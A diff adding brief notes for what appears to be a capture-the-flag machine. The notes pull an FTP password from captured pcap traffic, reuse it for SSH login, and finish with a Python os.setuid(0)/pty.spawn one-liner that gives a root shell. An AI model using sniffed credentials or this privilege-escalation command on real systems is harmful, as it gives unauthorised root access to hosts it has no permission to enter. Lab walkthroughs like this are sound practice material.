@@ -1,0 +1,15 @@
+Search for pcap data before yours in 80
+follow tcp stream
+
+USER nathan
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+
+login ssh Buck3tH4TF0RM3!
+
+cat app.py
+see setuid
+
+python3 -c 'import os; import pty; os.setuid(0); pty.spawn("/bin/bash");'
+
+get root
